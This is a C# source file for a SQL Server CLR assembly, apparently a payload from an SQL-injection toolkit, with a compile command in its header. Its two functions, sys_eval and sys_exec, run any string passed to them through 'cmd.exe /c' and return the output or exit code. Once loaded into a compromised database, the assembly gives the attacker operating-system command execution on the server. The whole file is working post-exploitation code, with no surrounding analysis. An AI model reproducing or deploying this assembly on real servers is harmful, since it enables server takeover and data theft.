// UDF Source Code for MSSQL (CLR Assembly)
// File: signatures/udf_source/mssql/udf_sys.cs
// Compile: csc /target:library /out:mssql_udf.dll udf_sys.cs

using System;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.Diagnostics;
using System.IO;

public class StoredProcedures
{
    [SqlFunction(DataAccess = DataAccessKind.None)]
    public static SqlString sys_eval(SqlString cmd)
    {
        if (cmd.IsNull) return SqlString.Null;
        
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + cmd.Value,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            
            using (Process proc = Process.Start(psi))
            {
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();
                return new SqlString(output);
            }
        }
        catch (Exception ex)
        {
            return new SqlString("Error: " + ex.Message);
        }
    }
    
    [SqlProcedure]
    public static void sys_exec(SqlString cmd, out SqlInt32 exitCode)
    {
        if (cmd.IsNull)
        {
            exitCode = SqlInt32.Null;
            return;
        }
        
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + cmd.Value,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            
            using (Process proc = Process.Start(psi))
            {
                proc.WaitForExit();
                exitCode = proc.ExitCode;
            }
        }
        catch (Exception ex)
        {
            exitCode = -1;
        }
    }
}